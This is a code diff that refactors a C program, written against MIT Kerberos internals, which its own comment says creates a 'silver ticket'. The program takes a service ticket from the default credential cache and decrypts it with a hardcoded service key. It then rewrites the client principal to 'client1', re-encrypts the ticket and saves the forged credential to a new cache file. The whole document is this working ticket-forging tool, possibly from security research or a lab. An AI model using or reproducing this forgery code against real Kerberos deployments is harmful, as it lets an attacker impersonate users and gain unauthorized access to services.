@@ -13,15 +13,7 @@ krb5_error_code encode_krb5_enc_tkt_part(const krb5_enc_tkt_part *rep, krb5_data
 void KRB5_CALLCONV krb5_free_enc_tkt_part(krb5_context, krb5_enc_tkt_part *);
 krb5_error_code encode_krb5_ticket(const krb5_ticket *rep, krb5_data **code);
 
-// taken from k5-platform.h, original code also cares about optimizing out the zeroing part
-void zapfree(void *ptr, size_t len) {
-    if (ptr != NULL) {
-        if (len > 0)
-            memset(ptr, 0, len);
-        free(ptr);
-        ptr = NULL;
-    }
-}
+krb5_context context;
 
 void hexdump(const void *data, size_t size) {
     char ascii[17];
@@ -95,22 +87,102 @@ uint8_t *datahex(char *string) {
     return data;
 }
 
-int main(int argc, char *argv[]) {
-    char *progname;
-    // krb5_error_code ret;
-    krb5_context context;
-    krb5_keyblock srv_key;
-    krb5_principal new_princ;
+/*
+ * read one credential from default cache
+ */
+void get_creds(krb5_creds *out_creds) {
     krb5_ccache cache;
     krb5_principal princ;
     char *princ_name;
     krb5_cc_cursor cur;
-    krb5_creds creds;
+
+    krb5_cc_default(context, &cache);
+    krb5_cc_get_principal(context, cache, &princ);
+    krb5_unparse_name(context, princ, &princ_name);
+    krb5_free_principal(context, princ);
+    printf("Ticket cache: %s:%s\nDefault principal: %s\n\n", krb5_cc_get_type(context, cache), krb5_cc_get_name(context, cache), princ_name);
+    krb5_free_unparsed_name(context, princ_name);
+
+    // get credential, expects only one "service for service" credential to be mangled
+    krb5_cc_start_seq_get(context, cache, &cur);
+    krb5_cc_next_cred(context, cache, &cur, out_creds);
+    krb5_cc_end_seq_get(context, cache, &cur);
+    krb5_cc_close(context, cache);
+
+    printf("creds session key:\n");
+    hexdump(out_creds->keyblock.contents, out_creds->keyblock.length);
+
+    return;
+}
+
+/*
+ * generate new ticket krb5_data from the template
+ */
+void customize_ticket(krb5_creds *creds, krb5_keyblock *key, krb5_principal *new_princ, krb5_data **out_ticket) {
     krb5_ticket *tkt = NULL;
     krb5_data scratch;
+    krb5_data *scratch2 = NULL;
     krb5_enc_tkt_part *dec_tkt_part = NULL;
-    krb5_data *new_scratch = NULL;
+
+    krb5_decode_ticket(&creds->ticket, &tkt);
+    scratch.length = tkt->enc_part.ciphertext.length;
+    scratch.data = malloc(tkt->enc_part.ciphertext.length);
+    krb5_c_decrypt(context, key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, &tkt->enc_part, &scratch);
+    decode_krb5_enc_tkt_part(&scratch, &dec_tkt_part);
+    krb5_free_data_contents(context, &scratch);
+
+    printf("decrypted ticket session key:\n");
+    hexdump(dec_tkt_part->session->contents, dec_tkt_part->session->length);
+
+    krb5_free_principal(context, dec_tkt_part->client);
+    krb5_copy_principal(context, *new_princ, &dec_tkt_part->client);
+
+    encode_krb5_enc_tkt_part(dec_tkt_part, &scratch2);
+    krb5_c_encrypt(context, key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, scratch2, &tkt->enc_part);
+    encode_krb5_ticket(tkt, out_ticket);
+    krb5_free_data(context, scratch2);
+
+    krb5_free_enc_tkt_part(context, dec_tkt_part);
+    krb5_free_ticket(context, tkt);
+
+    return;
+}
+
+/*
+ * update credential principal and ticket
+ */
+void customize_creds(krb5_creds *creds, krb5_principal *new_princ, krb5_data *new_ticket) {
+
+    krb5_free_data_contents(context, &creds->ticket);
+    creds->ticket = *new_ticket;
+    krb5_free_principal(context, creds->client);
+    krb5_copy_principal(context, *new_princ, &creds->client);
+
+    return;
+}
+
+/*
+ * save creds to disk
+ */
+void save_creds(krb5_creds *creds) {
     krb5_ccache new_cache;
+
+    krb5_cc_new_unique(context, "FILE", NULL, &new_cache);
+    printf("new cache name: %s\n", krb5_cc_get_name(context, new_cache));
+    krb5_cc_initialize(context, new_cache, creds->client);
+    krb5_cc_store_cred(context, new_cache, creds);
+    krb5_cc_close(context, new_cache);
+}
+
+/*
+ * create silver ticket from TGS
+ */
+int main(int argc, char *argv[]) {
+    char *progname;
+    krb5_keyblock srv_key;
+    krb5_principal new_princ;
+    krb5_creds creds;
+    krb5_data *new_ticket = NULL;
 
     progname = argv[0];
 
@@ -122,64 +194,16 @@ int main(int argc, char *argv[]) {
     srv_key.contents = (krb5_octet *)datahex("9c008f673b0c34d28ff483587f77ddb76f35545fcc69a0ae709f16f20e8765ee");
     krb5_parse_name(context, "client1", &new_princ);
 
-    // resolve default cache and print basic info
-    krb5_cc_default(context, &cache);
-    krb5_cc_get_principal(context, cache, &princ);
-    krb5_unparse_name(context, princ, &princ_name);
-    krb5_free_principal(context, princ);
-    printf("Ticket cache: %s:%s\nDefault principal: %s\n\n", krb5_cc_get_type(context, cache), krb5_cc_get_name(context, cache), princ_name);
-    krb5_free_unparsed_name(context, princ_name);
+    get_creds(&creds);
+    customize_ticket(&creds, &srv_key, &new_princ, &new_ticket);
+    customize_creds(&creds, &new_princ, new_ticket);
+    free(new_ticket); // must not free ticket contents here as it's swapped into creds
+    save_creds(&creds);
 
-    // get credential, expects only one "service for service" credential to be mangled
-    krb5_cc_start_seq_get(context, cache, &cur);
-    krb5_cc_next_cred(context, cache, &cur, &creds);
-    krb5_cc_end_seq_get(context, cache, &cur);
-    printf("creds session key:\n");
-    hexdump(creds.keyblock.contents, creds.keyblock.length);
-
-    // decode ticket blob, decrypt ticket blob, decode decrypted ticket
-    krb5_decode_ticket(&creds.ticket, &tkt);
-    scratch.length = tkt->enc_part.ciphertext.length;
-    scratch.data = malloc(tkt->enc_part.ciphertext.length);
-    krb5_c_decrypt(context, &srv_key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, &tkt->enc_part, &scratch);
-    decode_krb5_enc_tkt_part(&scratch, &dec_tkt_part);
-    zapfree(scratch.data, scratch.length);
-    printf("decrypted ticket session key:\n");
-    hexdump(dec_tkt_part->session->contents, dec_tkt_part->session->length);
-
-    // replace client principals in ticket and credential
-    krb5_free_principal(context, dec_tkt_part->client);
-    krb5_copy_principal(context, new_princ, &dec_tkt_part->client);
-    krb5_free_principal(context, creds.client);
-    krb5_copy_principal(context, new_princ, &creds.client);
-
-    // encrypt updated ticket
-    encode_krb5_enc_tkt_part(dec_tkt_part, &new_scratch);
-    krb5_free_enc_tkt_part(context, dec_tkt_part);
-    krb5_c_encrypt(context, &srv_key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, new_scratch, &tkt->enc_part);
-    krb5_free_data(context, new_scratch);
-
-    // use new ticket (the ticket is in fact "deserialized copy")
-    encode_krb5_ticket(tkt, &new_scratch);
-    krb5_free_ticket(context, tkt);
-    krb5_free_data_contents(context, &creds.ticket);
-    creds.ticket = *new_scratch;
-    free(new_scratch);
-
-    // save new cache
-    krb5_cc_new_unique(context, "FILE", NULL, &new_cache);
-    printf("new cache name: %s\n", krb5_cc_get_name(context, new_cache));
-    krb5_cc_initialize(context, new_cache, new_princ);
-    krb5_cc_store_cred(context, new_cache, &creds);
-    krb5_cc_close(context, new_cache);
-
-    // close source cache
+    // cleanup
     krb5_free_cred_contents(context, &creds);
-    krb5_cc_close(context, cache);
-
-    // cleanup args
-    zapfree(srv_key.contents, srv_key.length);
     krb5_free_principal(context, new_princ);
+    krb5_free_keyblock_contents(context, &srv_key);
 
     krb5_free_context(context);
 
